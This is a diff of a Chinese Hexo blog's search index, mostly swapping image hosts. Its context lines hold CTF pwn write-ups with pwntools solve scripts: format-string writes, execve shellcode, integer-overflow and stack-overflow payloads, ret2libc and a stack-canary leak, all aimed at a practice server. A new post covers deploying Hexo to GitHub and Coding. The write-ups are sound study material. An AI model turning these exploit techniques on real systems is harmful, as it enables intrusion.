-<p><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-13-59-15.png" alt="2020-06-06-13-59-15"><br>在第三个函数中发现了关键代码，程序将用户输入的字符强制转化成函数执行，执行的条件就是<code>*a1 == a1[1]</code>,逆推发现<code>a1</code>就是<code>V3</code>,所以条件就是<code>V3[0]=V3[1]</code>就是这里可以用来输入<code>shellcode</code>.</p>
+<p>查看程序安全机制<br><img src="https://pic.xsblog.xyz/blog/2020-06-06-13-44-13.png" alt="2020-06-06-13-44-13">  </p>
+<p>拖入IDA查看反汇编代码<br><img src="https://pic.xsblog.xyz/blog/2020-06-06-13-52-14.png" alt="2020-06-06-13-52-14"><br>输出了V4的值，其他暂未发现异常，跟进查看<br><img src="https://pic.xsblog.xyz/blog/2020-06-06-13-53-23.png" alt="2020-06-06-13-53-23"><br>创建了一个新的游戏人物，同时调用了三个函数，依次跟进查看</p>
+<p><img src="https://pic.xsblog.xyz/blog/2020-06-06-13-54-49.png" alt="2020-06-06-13-54-49"><br>在第一个函数中碰到了一个循环，必须输入east才能跳出循环  </p>
+<p><img src="https://pic.xsblog.xyz/blog/2020-06-06-13-56-49.png" alt="2020-06-06-13-56-49"><br>在第二个函数中发现了格式化字符串漏洞，触发条件为<code>v1==1</code>  </p>
+<p><img src="https://pic.xsblog.xyz/blog/2020-06-06-13-59-15.png" alt="2020-06-06-13-59-15"><br>在第三个函数中发现了关键代码，程序将用户输入的字符强制转化成函数执行，执行的条件就是<code>*a1 == a1[1]</code>,逆推发现<code>a1</code>就是<code>V3</code>,所以条件就是<code>V3[0]=V3[1]</code>就是这里可以用来输入<code>shellcode</code>.</p>
 <p><strong>攻击思路:</strong> 利用格式化字符创漏洞修改<code>V3[0]</code>的值，再输入一个<code>shellcode</code>获取shell,可以在<a href="http://shell-storm.org/shellcode/" target="_blank" rel="noopener">http://shell-storm.org/shellcode/</a>网站上找到对应的<code>shellcode</code>来获取shell  </p>
 <p><strong>解题脚本:</strong></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">'220.249.52.133'</span>,<span class="string">'35103'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'secret[0] is '</span>)</span><br><span class="line">v3 = int(io.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">io.recvuntil(<span class="string">'name be:\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'aa'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'east or up?:\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'east'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'or leave(0)?:\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'1'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'address\'\n'</span>)</span><br><span class="line">io.sendline(str(v3))	<span class="comment"># str用于将十进制以字符串形式输出，例：111输出'111'</span></span><br><span class="line">io.recvuntil(<span class="string">' wish is:\n'</span>)</span><br><span class="line">payload = <span class="string">'%85c%7$n'</span>	</span><br><span class="line"><span class="comment"># 64位程序格式化字符串漏洞中，格式化字符串的第六个偏移地址是调用printf的函数的栈上的第一个QWORD(64位)</span></span><br><span class="line"><span class="comment"># 而第二个QWORD即为V2的值</span></span><br><span class="line"><span class="comment"># 所以这里我们的偏移地址设为7，修改V2所指向的V3[0]</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">'YOU SPELL\n'</span>)</span><br><span class="line">shellcode = <span class="string">'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'</span></span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
@@ -194,8 +162,8 @@
 <h2 id="0x0A-int-overflow"><a href="#0x0A-int-overflow" class="headerlink" title="0x0A int_overflow"></a>0x0A int_overflow</h2><blockquote>
 <p>题目描述: 菜鸡感觉这题似乎没有办法溢出，真的么?</p>
 </blockquote>
-<p>查看安全机制<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-16-06-33.png" alt="2020-06-06-16-06-33">    </p>
-<p>拖入IDA查看反汇编代码<br>跟近查看，进入到<code>chek_passwd</code><br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-16-22-15.png" alt="2020-06-06-16-22-15"><br>出现危险函数<code>strcpy</code>，存在栈溢出漏洞，但是要想触发漏洞，必须使得v3在3和8之间<br>v3的值为s字符串的长度，根据题目提示想到整数溢出，利用整数溢出触发漏洞  </p>
+<p>查看安全机制<br><img src="https://pic.xsblog.xyz/blog/2020-06-06-16-06-33.png" alt="2020-06-06-16-06-33">    </p>
+<p>拖入IDA查看反汇编代码<br>跟近查看，进入到<code>chek_passwd</code><br><img src="https://pic.xsblog.xyz/blog/2020-06-06-16-22-15.png" alt="2020-06-06-16-22-15"><br>出现危险函数<code>strcpy</code>，存在栈溢出漏洞，但是要想触发漏洞，必须使得v3在3和8之间<br>v3的值为s字符串的长度，根据题目提示想到整数溢出，利用整数溢出触发漏洞  </p>
 <p><strong>解题脚本:</strong></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">'220.249.52.133'</span>,<span class="string">'46540'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'choice:'</span>)</span><br><span class="line">io.sendline(<span class="string">'1'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'username:\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'aa'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'passwd:\n'</span>)</span><br><span class="line"><span class="comment"># v3大小为8个字节，范围为0~255</span></span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x18</span>+p32(<span class="number">0x0804868B</span>)+<span class="string">'A'</span>*(<span class="number">259</span><span class="number">-0x18</span><span class="number">-4</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
@@ -208,8 +176,8 @@
 <li><a href="https://blog.csdn.net/linyt/article/details/51893258" target="_blank" rel="noopener">Linux动态链接中的PLT和GOT</a>  </li>
 </ul>
 <p><code>libc_32.so.6</code>中存放的是程序运行时所用到的外部函数，通过PLT表和GOT表连接到主程序中   </p>
-<p>查看安全机制<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-16-58-09.png" alt="2020-06-06-16-58-09"><br>没有开启<code>PIE</code>，所以<code>libc</code>中函数的相对地址不发生变化(程序自带函数地址也不会发生变化)，也就是说只要知道<code>libc</code>在程序中的的基址，根据偏移地址就可以知道任何函数在程序中的实际地址  </p>
-<p>拖入IDA查看反汇编代码<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-06-17-35-00.png" alt="2020-06-06-17-35-00"><br>在<code>vulnerable_function()</code>中<code>read()</code>函数存在溢出，然而程序中并没有现成的system函数，所以必须想办法调用动态连接库中的函数</p>
+<p>查看安全机制<br><img src="https://pic.xsblog.xyz/blog/2020-06-06-16-58-09.png" alt="2020-06-06-16-58-09"><br>没有开启<code>PIE</code>，所以<code>libc</code>中函数的相对地址不发生变化(程序自带函数地址也不会发生变化)，也就是说只要知道<code>libc</code>在程序中的的基址，根据偏移地址就可以知道任何函数在程序中的实际地址  </p>
+<p>拖入IDA查看反汇编代码<br><img src="https://pic.xsblog.xyz/blog/2020-06-06-17-35-00.png" alt="2020-06-06-17-35-00"><br>在<code>vulnerable_function()</code>中<code>read()</code>函数存在溢出，然而程序中并没有现成的system函数，所以必须想办法调用动态连接库中的函数</p>
 <p><strong>攻击思路:</strong> 利用栈溢出返回到<code>write</code>函数(注意:只能通过plt调用函数，不能直接跳转到got表)，同时传入<code>write</code>函数的<code>got</code>表的地址，由于程序没有开启<code>PIE</code>保护，所以程序中<code>plt</code>表和<code>got</code>表的位置都是不会变化的，函数的相对地址也是固定的，所以可以通过本地的程序获取<code>write</code>函数<code>got</code>表的地址，然后输出<code>write</code>函数实际地址。<br>将得到的实际地址与<code>libc</code>中的<code>write</code>的偏移地址相减，则可以得到<code>libc</code>的基地址，加上<code>system</code>函数在<code>libc</code>里面的偏移地址，就可以得到<code>system</code>函数在程序中的实际地址<br>此时利用溢出再次控制返回函数到<code>main</code>函数，二次攻击溢出返回到<code>system</code>函数，传入<code>/bin/sh</code>参数，就可以得到<code>shell</code>了  </p>
 <p><strong>注:</strong> 字符串<code>/bin/sh</code>可以在libc中找到，查找方法如下</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strings -a -t x libc_32.so.6 | grep &quot;&#x2F;bin&#x2F;sh&quot;</span><br></pre></td></tr></table></figure>
@@ -230,31 +198,31 @@
     <content><![CDATA[<p>持续更新攻防世界pwn进阶区刷题过程。。。</p>
 <a id="more"></a>
 <hr>
-<h2 id="0x01-dice-game"><a href="#0x01-dice-game" class="headerlink" title="0x01 dice_game"></a>0x01 dice_game</h2><p>查看安全机制<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-07-10-18-56.png" alt="2020-06-07-10-18-56">  </p>
-<p>拖入IDA查看反汇编代码<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-07-10-20-03.png" alt="2020-06-07-10-20-03"><br>可以看到read函数处，虽然不存在栈溢出，但可以通过read函数修改栈中任意值  </p>
+<h2 id="0x01-dice-game"><a href="#0x01-dice-game" class="headerlink" title="0x01 dice_game"></a>0x01 dice_game</h2><p>查看安全机制<br><img src="https://pic.xsblog.xyz/blog/2020-06-07-10-18-56.png" alt="2020-06-07-10-18-56">  </p>
+<p>拖入IDA查看反汇编代码<br><img src="https://pic.xsblog.xyz/blog/2020-06-07-10-20-03.png" alt="2020-06-07-10-20-03"><br>可以看到read函数处，虽然不存在栈溢出，但可以通过read函数修改栈中任意值  </p>
 <p>整个题目的逻辑就是猜数字，猜中50次返回flag<br>可以通read函数修改随机数种子seed的值，利用题目提供的动态链接库，采用python和c混合编程解题</p>
 <p><strong>解题脚本:</strong></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">'220.249.52.133'</span>,<span class="string">'39262'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'name: '</span>)</span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x40</span>+p64(<span class="number">1</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">'libc.so.6'</span>)    </span><br><span class="line"><span class="comment">#注: 有些函数不支持使用相对地址，所以文件与脚本在同一文件夹的话，直接写文件名就可以了</span></span><br><span class="line">libc.srand(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">	io.recvuntil(<span class="string">'point(1~6): '</span>)</span><br><span class="line">	io.sendline(str(libc.rand()%<span class="number">6</span>+<span class="number">1</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
-<h2 id="0x02-stack2"><a href="#0x02-stack2" class="headerlink" title="0x02 stack2"></a>0x02 stack2</h2><p>查看安全机制<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-07-10-28-07.png" alt="2020-06-07-10-28-07">  </p>
-<p>拖入IDA中查看源代码<br>程序的逻辑大概就是，输入几个数求取平均值<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-10-22-20-29.png" alt="2020-06-10-22-20-29"><br>可以看到，在改变数组的数字时，没有对输入的v5的值做检测，导致v5可以取任意值，从而可以利用赋值语句实现对任意地址写<br>查看v13的地址<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-10-22-27-24.png" alt="2020-06-10-22-27-24"><br>可以看到v13离ebp偏移为0x70，然而程序开启了栈保护机制，程序的真正返回地址并不是在ebp的下一位，需要根据动态调试确定返回地址  </p>
-<p>使用IDA远程调试程序<br>将断点设置在赋值语句处，将v[0]的值改编为23(0x17)<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-10-22-44-03.png" alt="2020-06-10-22-44-03"><br>运行到断点处，查看汇编程序，逐步执行<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-10-22-45-51.png" alt="2020-06-10-22-45-51"><br>看到程序最后把值赋值给了[ebp+eax+var_70],查看其在栈中地址，注意要先等eax复制完再查看，eax为地址组成部分<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-10-23-02-04.png" alt="2020-06-10-23-02-04"><br>看到v13首地址为<code>FFAE8DD8</code>  </p>
-<p>接下来是计算返回地址，继续运行程序，然后输入5结束程序<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-10-22-53-31.png" alt="2020-06-10-22-53-31"><br>跟随程序汇编代码执行情况<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-10-22-54-27.png" alt="2020-06-10-22-54-27"><br>直到运行到return处，此时esp的值即为返回地址的正真地址，即<code>FFAE8E5C</code><br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-10-23-03-36.png" alt="2020-06-10-23-03-36">  </p>
+<h2 id="0x02-stack2"><a href="#0x02-stack2" class="headerlink" title="0x02 stack2"></a>0x02 stack2</h2><p>查看安全机制<br><img src="https://pic.xsblog.xyz/blog/2020-06-07-10-28-07.png" alt="2020-06-07-10-28-07">  </p>
+<p>拖入IDA中查看源代码<br>程序的逻辑大概就是，输入几个数求取平均值<br><img src="https://pic.xsblog.xyz/blog/2020-06-10-22-20-29.png" alt="2020-06-10-22-20-29"><br>可以看到，在改变数组的数字时，没有对输入的v5的值做检测，导致v5可以取任意值，从而可以利用赋值语句实现对任意地址写<br>查看v13的地址<br><img src="https://pic.xsblog.xyz/blog/2020-06-10-22-27-24.png" alt="2020-06-10-22-27-24"><br>可以看到v13离ebp偏移为0x70，然而程序开启了栈保护机制，程序的真正返回地址并不是在ebp的下一位，需要根据动态调试确定返回地址  </p>
+<p>使用IDA远程调试程序<br>将断点设置在赋值语句处，将v[0]的值改编为23(0x17)<br><img src="https://pic.xsblog.xyz/blog/2020-06-10-22-44-03.png" alt="2020-06-10-22-44-03"><br>运行到断点处，查看汇编程序，逐步执行<br><img src="https://pic.xsblog.xyz/blog/2020-06-10-22-45-51.png" alt="2020-06-10-22-45-51"><br>看到程序最后把值赋值给了[ebp+eax+var_70],查看其在栈中地址，注意要先等eax复制完再查看，eax为地址组成部分<br><img src="https://pic.xsblog.xyz/blog/2020-06-10-23-02-04.png" alt="2020-06-10-23-02-04"><br>看到v13首地址为<code>FFAE8DD8</code>  </p>
+<p>接下来是计算返回地址，继续运行程序，然后输入5结束程序<br><img src="https://pic.xsblog.xyz/blog/2020-06-10-22-53-31.png" alt="2020-06-10-22-53-31"><br>跟随程序汇编代码执行情况<br><img src="https://pic.xsblog.xyz/blog/2020-06-10-22-54-27.png" alt="2020-06-10-22-54-27"><br>直到运行到return处，此时esp的值即为返回地址的正真地址，即<code>FFAE8E5C</code><br><img src="https://pic.xsblog.xyz/blog/2020-06-10-23-03-36.png" alt="2020-06-10-23-03-36">  </p>
 <p>使用两个地址相减即可得到真正的偏移地址<br>0xFFAE8E5C-0xFFAE8DD8=0x84</p>
 <p>由于服务器没有bash命令行，所以我们需要构造字符串，通过程序中有的’bash’截取’sh’部分作为参数输入  </p>
 <p><strong>解题脚本:</strong>  </p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">'220.249.52.133'</span>,<span class="string">'36772'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'How many numbers you have:\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'1'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'Give me your numbers\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'1'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">	io.recvuntil(<span class="string">'5. exit\n'</span>)</span><br><span class="line">	io.sendline(<span class="string">'3'</span>)</span><br><span class="line">	io.recvuntil(<span class="string">'which number to change:\n'</span>)</span><br><span class="line">	io.sendline(str(<span class="number">132</span>+i))</span><br><span class="line">	io.recvuntil(<span class="string">'new number:\n'</span>)</span><br><span class="line">	io.sendline(str(int(<span class="string">'50840408'</span>[<span class="number">2</span>*i:<span class="number">2</span>*i+<span class="number">2</span>],<span class="number">16</span>)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">	io.recvuntil(<span class="string">'5. exit\n'</span>)</span><br><span class="line">	io.sendline(<span class="string">'3'</span>)</span><br><span class="line">	io.recvuntil(<span class="string">'which number to change:\n'</span>)</span><br><span class="line">	io.sendline(str(<span class="number">132</span>+i+<span class="number">8</span>))</span><br><span class="line">	io.recvuntil(<span class="string">'new number:\n'</span>)</span><br><span class="line">	io.sendline(str(int(<span class="string">'87890408'</span>[<span class="number">2</span>*i:<span class="number">2</span>*i+<span class="number">2</span>],<span class="number">16</span>)))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'5. exit\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'5'</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
-<h2 id="0x03-forgot"><a href="#0x03-forgot" class="headerlink" title="0x03 forgot"></a>0x03 forgot</h2><p>查看安全机制：<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-11-20-22-16.png" alt="2020-06-11-20-22-16">   </p>
-<p>拖入IDA查看反汇编代码<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-11-20-24-04.png" alt="2020-06-11-20-24-04"><br>在scanf函数处存在溢出，可以利用其修改变量的值，在程序的结尾利用函数指针来调用函数，v14为偏移量  </p>
+<h2 id="0x03-forgot"><a href="#0x03-forgot" class="headerlink" title="0x03 forgot"></a>0x03 forgot</h2><p>查看安全机制：<br><img src="https://pic.xsblog.xyz/blog/2020-06-11-20-22-16.png" alt="2020-06-11-20-22-16">   </p>
+<p>拖入IDA查看反汇编代码<br><img src="https://pic.xsblog.xyz/blog/2020-06-11-20-24-04.png" alt="2020-06-11-20-24-04"><br>在scanf函数处存在溢出，可以利用其修改变量的值，在程序的结尾利用函数指针来调用函数，v14为偏移量  </p>
 <p><strong>攻击思路:</strong> 利用溢出修改v14的值，同时修改偏移量对于函数指针的值，注意到只有将v14修改为10或者9，可以绕过前面的字符串检测，然而0x0a和0x09均为坏字符，也就是会将字符串截断，导致无法输入到程序中，所以只可以将其修改成0x8，并需要使字符串通过最后一个检测，跟进最后一个检测，只要第一个字符ascii满足大于96小于等于122即可   </p>
 <p><strong>解题脚本:</strong></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">'220.249.52.133'</span>,<span class="string">'51231'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">io.sendline(<span class="string">'11'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x74</span><span class="number">-0x30</span>)+p32(<span class="number">0x080486CC</span>)+<span class="string">'a'</span>*(<span class="number">0x30</span><span class="number">-0xc</span><span class="number">-4</span>)+p32(<span class="number">8</span>)	<span class="comment">#'a'的ascii值满足大于96小于等于122</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
-<h2 id="0x04-Mary-Morton"><a href="#0x04-Mary-Morton" class="headerlink" title="0x04 Mary_Morton"></a>0x04 Mary_Morton</h2><p>查看安全机制:<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-13-19-53-51.png" alt="2020-06-13-19-53-51">  </p>
-<p>拖入IDA查看反汇编代码<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-13-19-56-11.png" alt="2020-06-13-19-56-11"><br>程序给了两种攻击方式：栈溢出和格式化字符串漏洞<br>而由于程序开启了<code>stack cannary</code>，因此无法直接进行堆栈溢出，需要想办法绕过cannary<br>关于cannary保护机制可以参考这篇文章<a href="https://www.ichenxiaoyu.com/ctf2/" target="_blank" rel="noopener">https://www.ichenxiaoyu.com/ctf2/</a>  </p>
+<h2 id="0x04-Mary-Morton"><a href="#0x04-Mary-Morton" class="headerlink" title="0x04 Mary_Morton"></a>0x04 Mary_Morton</h2><p>查看安全机制:<br><img src="https://pic.xsblog.xyz/blog/2020-06-13-19-53-51.png" alt="2020-06-13-19-53-51">  </p>
+<p>拖入IDA查看反汇编代码<br><img src="https://pic.xsblog.xyz/blog/2020-06-13-19-56-11.png" alt="2020-06-13-19-56-11"><br>程序给了两种攻击方式：栈溢出和格式化字符串漏洞<br>而由于程序开启了<code>stack cannary</code>，因此无法直接进行堆栈溢出，需要想办法绕过cannary<br>关于cannary保护机制可以参考这篇文章<a href="https://www.ichenxiaoyu.com/ctf2/" target="_blank" rel="noopener">https://www.ichenxiaoyu.com/ctf2/</a>  </p>
 <p>攻击思路：在一个程序运行过程中cannary的值通常是不会变的，会应用于多个函数，因此可以考虑到利用格式化字符串漏洞，爆出cannary，然后利用栈溢出漏洞获取flag，栈溢出过程中用正确的cannary覆盖。</p>
-<p>cannary存放的地址一般在离ebp最近的地方，可以看到v2变量就是我们要获取的cannary<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-06-13-20-08-13.png" alt="2020-06-13-20-08-13">   </p>
+<p>cannary存放的地址一般在离ebp最近的地方，可以看到v2变量就是我们要获取的cannary<br><img src="https://pic.xsblog.xyz/blog/2020-06-13-20-08-13.png" alt="2020-06-13-20-08-13">   </p>
 <p><strong>解题脚本:</strong>  </p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">'220.249.52.133'</span>,<span class="string">'30458'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'3. Exit the battle \n'</span>)</span><br><span class="line">io.sendline(<span class="string">'2'</span>)</span><br><span class="line">payload = <span class="string">'%23$p'</span>	</span><br><span class="line"><span class="comment"># 这里要注意的是，根据函数调用约定，偏移6处是函数的第一个局部变量，而v2距离第一个局部变量buf的偏移是(0x90-0x8)/8=17,所以总的偏移就是6+17=23</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">cannary = int(io.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line"><span class="comment">#这里要注意用%p输出的十六进制与内存中数据存放的顺序是相反的</span></span><br><span class="line">io.recvuntil(<span class="string">'3. Exit the battle \n'</span>)</span><br><span class="line">io.sendline(<span class="string">'1'</span>)</span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x88</span>+p64(cannary)+<span class="string">'A'</span>*<span class="number">8</span>+p64(<span class="number">0x4008DA</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
@@ -270,11 +238,149 @@
       </tags>
   </entry>
   <entry>
+    <title>hexo同时部署到github和coding</title>
+    <url>/2020/07/06/hexo%E5%90%8C%E6%97%B6%E9%83%A8%E7%BD%B2%E5%88%B0github%E5%92%8Ccoding/</url>
+    <content><![CDATA[<p>github服务器访问太慢，尝试同时搭建到github和coding</p>
+<a id="more"></a>
+<hr>
+<h2 id="配置github"><a href="#配置github" class="headerlink" title="配置github"></a>配置github</h2><p>首先需要创建一个仓库，名字为<code>yourname</code>.github.io，其中<code>yourname</code>为你注册时的用户名<br><img src="https://pic.xsblog.xyz/blog/2020-07-06-15-08-11.png" alt="2020-07-06-15-08-11"><br>在setting-&gt;Options-&gt;GitHub Pages里面设置page服务，一般已经配置好了<br>然后就是将ssh密钥传到github上，首先在本地生成密钥</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;your_github_email@example.com&quot;</span><br></pre></td></tr></table></figure>
+<p>运行命令连续敲三个空格就可以了，会在<code>/root/.ssh</code>生成密钥文件<br>打开github设置，Settings-&gt;SSH and GPG keys，添加密钥，名字随意，key的内容使将刚刚生成的密钥文件id_rsa.pub中所有的内容复制过去<br>运行以下命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure>
+<p>出现以下提示表示配置成功</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hi xxxxxx! You&#39;ve successfully authenticated, but GitHub does not provide shell access.</span><br></pre></td></tr></table></figure>
+
+<h2 id="配置coding"><a href="#配置coding" class="headerlink" title="配置coding"></a>配置coding</h2><p>coding和github应该使用同一个邮箱注册<br>新建项目（DevOps项目），其他类型的项目没有page服务，项目名称与用户名相同，在持续部署中找到静态网站，实名认证之后发布静态网站<br>在个人设置里添加ssh公钥，和github使用的公钥一样复制就行<br>运行以下命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -T git@coding.net</span><br></pre></td></tr></table></figure>
+<p>出现以下提示表示配置成功</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Coding 提示: Hello xxxxx, You&#39;ve connected to Coding.net via SSH. This is a personal key.</span><br><span class="line">xxxxxx，你好，你已经通过 SSH 协议认证 Coding.net 服务，这是一个个人公钥.</span><br><span class="line">公钥指纹：xx:xx:xx:xx:xx:xx:xx</span><br></pre></td></tr></table></figure>
+
+<h2 id="配置服务端"><a href="#配置服务端" class="headerlink" title="配置服务端"></a>配置服务端</h2><p>配置hexo根目录文件_config.yml<br>添加以下配置</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo:</span><br><span class="line">    github: git@github.com:yourname&#x2F;yourname.github.io.git</span><br><span class="line">    coding: git@e.coding.net:yourname&#x2F;yourname&#x2F;yourname.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
+<p>安装一键部署插件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>
+<p>接下来就是配置git  </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git config --global user.email &quot;you@example.com&quot;</span><br><span class="line">git config --global user.name &quot;Your Name&quot;</span><br></pre></td></tr></table></figure>
+<p>这里邮箱为注册邮箱，名字随意<br>然后<code>hexo g&amp;&amp;hexo d</code>即可实现部署<br>对于github，访问<code>yourname.github.io</code>测试是否可以成功访问<br>对于coding，访问其静态网站服务所提供的网址来测试  </p>
+<h2 id="域名绑定"><a href="#域名绑定" class="headerlink" title="域名绑定"></a>域名绑定</h2><p>我用的是阿里云，添加解析<br><img src="https://pic.xsblog.xyz/blog/2020-07-06-15-55-51.png" alt="2020-07-06-15-55-51"><br>在github的page服务出绑定刚添加的解析域名<br><img src="https://pic.xsblog.xyz/blog/2020-07-06-15-59-27.png" alt="2020-07-06-15-59-27"><br>在coding中也可以绑定域名，强制配置https<br><img src="https://pic.xsblog.xyz/blog/2020-07-06-16-02-00.png" alt="2020-07-06-16-02-00">   </p>
+<p>对于github，还要在source文件夹里面新建CNAME文件，里面加入所绑定的域名，不然每次部署之后，绑定的域名就会消失<br><img src="https://pic.xsblog.xyz/blog/2020-07-06-16-26-38.png" alt="2020-07-06-16-26-38"><br>以上就全部配置完毕了</p>
+]]></content>
+      <tags>
+        <tag>hexo</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>随笔一</title>
     <url>/2020/05/26/note/note1/</url>
